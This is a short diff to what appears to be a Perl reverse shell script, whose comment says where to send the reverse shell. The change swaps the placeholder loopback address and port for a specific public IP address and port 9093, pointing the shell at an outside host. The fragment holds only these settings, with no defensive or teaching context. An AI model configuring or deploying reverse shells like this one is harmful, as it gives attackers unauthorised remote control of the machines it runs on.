@@ -42,8 +42,8 @@ use POSIX;
 my $VERSION = "1.0";
 
 # Where to send the reverse shell.  Change these.
-my $ip = '127.0.0.1';
-my $port = 1234;
+my $ip = '171.249.60.78';
+my $port = 9093;
 
 # Options
 my $daemon = 1;
